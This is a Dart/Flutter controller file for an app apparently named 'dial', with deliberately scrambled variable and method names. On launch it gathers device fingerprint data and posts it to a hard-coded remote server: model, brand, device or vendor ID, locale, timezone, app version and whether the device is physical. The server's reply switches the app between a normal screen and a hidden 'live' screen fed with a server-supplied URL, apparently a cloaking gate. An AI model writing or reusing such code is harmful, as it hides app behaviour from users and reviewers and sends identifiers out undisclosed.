import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void ankjbksaso() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/dial_check");
  }
}

class DialCustomLogic extends GetxController {

  var tksvfe = RxBool(false);
  var yqlnheo = RxBool(true);
  var fcqgy = RxString("");
  var hallie = RxBool(false);
  var veum = RxBool(true);
  final lvuwjqrtm = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    ankjbksaso();
    super.onInit();
    hydq();
  }


  Future<void> hydq() async {

    hallie.value = true;
    veum.value = true;
    yqlnheo.value = false;

    lvuwjqrtm.post("https://ng.dbsai-st.cloud/mqgljzoacbxhvefpwktyidnrsu",data: await cormkytisw()).then((value) {
      var opam = value.data["opam"] as String;
      var lhpvg = value.data["lhpvg"] as bool;
      if (lhpvg) {
        fcqgy.value = opam;
        rose();
      } else {
        windler();
      }
    }).catchError((e) {
      yqlnheo.value = true;
      veum.value = true;
      hallie.value = false;
    });
  }

  Future<Map<String, dynamic>> cormkytisw() async {
    final DeviceInfoPlugin bdnogkv = DeviceInfoPlugin();
    PackageInfo ndmzx_vldj = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var xgakchr = Platform.localeName;
    var qeysr = currentTimeZone;

    var oqrvf = ndmzx_vldj.packageName;
    var dtfnjmol = ndmzx_vldj.version;
    var rzyvc = ndmzx_vldj.buildNumber;

    var hqjv = ndmzx_vldj.appName;
    var yjabt = "";
    var gyvn  = "";
    var xsodta = "";
    var agustinSporer = "";
    var cristobalVon = "";
    var jaylenToy = "";


    var dkgxrtj = "";
    var ucqxik = false;

    if (GetPlatform.isAndroid) {
      dkgxrtj = "android";
      var cwhzipt = await bdnogkv.androidInfo;

      xsodta = cwhzipt.brand;

      yjabt  = cwhzipt.model;
      gyvn = cwhzipt.id;

      ucqxik = cwhzipt.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dkgxrtj = "ios";
      var srbnacwg = await bdnogkv.iosInfo;
      xsodta = srbnacwg.name;
      yjabt = srbnacwg.model;

      gyvn = srbnacwg.identifierForVendor ?? "";
      ucqxik  = srbnacwg.isPhysicalDevice;
    }
    var res = {
      "hqjv": hqjv,
      "rzyvc": rzyvc,
      "oqrvf": oqrvf,
      "yjabt": yjabt,
      "cristobalVon" : cristobalVon,
      "qeysr": qeysr,
      "jaylenToy" : jaylenToy,
      "xsodta": xsodta,
      "gyvn": gyvn,
      "dtfnjmol": dtfnjmol,
      "xgakchr": xgakchr,
      "dkgxrtj": dkgxrtj,
      "ucqxik": ucqxik,
      "agustinSporer" : agustinSporer,

    };
    return res;
  }

  Future<void> windler() async {
    Get.offAllNamed("/dial_main");
  }

  Future<void> rose() async {
    Get.offAllNamed("/dial_live");
  }
}
